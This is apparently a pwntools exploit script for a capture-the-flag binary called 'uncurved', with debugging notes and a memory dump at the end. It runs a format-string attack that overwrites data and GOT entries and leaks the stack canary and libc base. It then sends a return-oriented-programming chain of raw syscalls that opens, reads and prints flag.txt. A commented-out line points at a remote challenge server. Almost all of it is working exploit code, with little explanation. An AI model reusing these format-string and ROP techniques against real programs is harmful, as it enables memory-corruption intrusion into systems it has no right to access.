from pwn import *
import os

elf = ELF("./uncurved")
ld = ELF("./ld-2.31.so")
libc = ELF("./libc-2.31.so")

#context.log_level = "ERROR"
target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
#target = remote("193.57.159.27", 27374)

target.sendlineafter(":", "whoamiT")

addrs = p64(0x404180) + p64(0x404020) + p64(0x404208)
addrs += p64(0x404182) + p64(0x404022) + p64(0x40420a) + p64(0x404131)
addrs += p64(0x404023) + p64(0x404024) + p64(0x404025)
addrs += p64(0x404208 + 4) + p64(0x404208 + 6)
addrs += "A"*0x20
target.sendafter(":", addrs)

gdb.attach(target, 'finish')# + '\nni'*6 + '\nx/40gx $rsp')
#555556a9b2a0.80.7fa0cbb70e8e.a.0.800000000.555556a9b2a0.4141414141414141
#fmt = "%p" + "%c"*(6+16) + "%p"*2 + "%" + str(0x1170 - 0x47 - 13) + "p" + "%p" + "0x"
fmt = "%25$p%27$p0x"
fmt += "%" + str(0x1357 - 34) + "c" + "%8$hn"
fmt += "%" + str(0x4130 - 0x1357) + "c" + "%9$hn"
fmt += "%" + str(0x4148 - 0x4130) + "c" + "%10$hn"
fmt += "%" + str(0x140 - 0x48) + "c" + "%11$hhn" + "%12$hhn" + "%13$hhn"
fmt += "%" + str(0x80 - 0x40) + "c" + "%14$hhn"
fmt += "%" + str(0x100 - 0x80) + "c" + "%15$hhn" + "%16$hhn" + "%17$hhn" + "%18$hhn" + "%19$hhn"

print("fmt len: " + hex(len(fmt)))
target.sendlineafter(":", fmt)

target.recvuntil("0x")
#heap_leak = int(target.recv(12), 0x10)
#target.recvuntil("0x")
#stack_leak = int(target.recvuntil("0x", drop=True), 0x10)
canary = int(target.recvuntil("0x", drop=True), 0x10)
#target.recvuntil("0x", drop=True)
libc_base = int(target.recvuntil("0x", drop=True), 0x10) - libc.sym['__libc_start_main'] - 234
#log.info("Stack Leak: " + hex(stack_leak))
#log.info("HEAP Leak: " + hex(heap_leak))
log.info("canary: " + hex(canary))
log.info("LIBC Base: " + hex(libc_base))

#target.interactive()
print target.recvuntil("Rythm ")
print("Entering sacred zone, close to getting flag :)")

pop_rdi = p64(libc_base + 0x0000000000026796)
pop_rsi = p64(libc_base + 0x000000000002890f)
pop_rdx = p64(libc_base + 0x00000000000cb1cd)
pop_rax = p64(libc_base + 0x000000000003ee88)
pop_rbx = p64(libc_base + 0x0000000000030fff)
sys_ret = p64(libc_base + 0x00000000000580da)
#0x000000000002772f : push rax ; call rbx
pushrax = p64(libc_base + 0x000000000002772f)
buf = 0x4042d0

def sys_gen(rax, rdi, rsi, rdx):
    return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + pop_rdx + p64(rdx) + sys_ret

payload = "A"*0x88 + p64(canary) + p64(0)
payload += sys_gen(0, 0, buf, 0x80)   #read flag.txt
payload += sys_gen(2, buf, 0, 0)        #open
payload += "a"*8                       #crappy breakpoint
payload += p64(libc_base + libc.sym['open'])
payload += sys_gen(0, 0x101, buf, 0x80)   #read from flag.txt
payload += sys_gen(1, 1, buf, 0x80)   #write flag
payload += sys_gen(60, 1337, 0, 0)      #exit
print target.sendlineafter(":", payload)

target.sendlineafter(":", "INPUT2")
target.sendlineafter(":", "INPUT3")

target.sendline("flag.txt")

target.interactive()
'''
0x7ffa0c107390 - 0x00007ffa0bf30000
0x7ffa0c107370
0x7ffa0bf6e5d0
>>> hex(- 0x00007ffa0bf30000 + 0x7ffa0c107390)
'0x1d7390'
>>> hex(- 0x00007ffa0bf30000 + 0x7ffa0c107370)
'0x1d7370'
>>> hex(- 0x00007ffa0bf30000 + 0x7ffa0bf6e5d0)
'0x3e5d0'

main --> 0x401357           _start --> 0x401170
0x404020
    |
0x404130:   0x0000000000008000  0x0000000000000000
0x404140:   0x0000000000000000  0x0000000000000000
0x404150:   0x0000000000000000  0x0000000000000000
0x404160:   0x0000000000000000  0x0000000000000000
0x404170:   0x0000000000000000  0x0000000000000000
0x404180:   main                0x0000000000000000
0x404190:   0x0000000000000000  0x0000000000000000
0x4041a0:   0x0000000000000000  0x0000000000000000
0x4041b0:   0x0000000000000000  0x0000000000000000
0x4041c0:   0x0000000000000000  0x0000000000000000
0x4041d0:   0x0000000000000000  0x0000000000000000
0x4041e0:   0x0000000000000000  0x0000000000000000
0x4041f0:   0x0000000000000000  0x0000000000000000
0x404200:   0x0000000000000000  0x0000000000404148
0x404210:   0x0000000000000000  0x0000000000000000
0x404220:   0x0000000000000000  0x0000000000000000
0x404230:   0x0000000000000000  0x0000000000000000
0x404240:   0x0000000000000000  0x0000000000000000
0x404250:   0x0000000000000000  0x0000000000000000
0x404260:   0x0000000000000000  0x0000000000000000
0x404270:   0x0000000000000000  0x0000000000000000

'''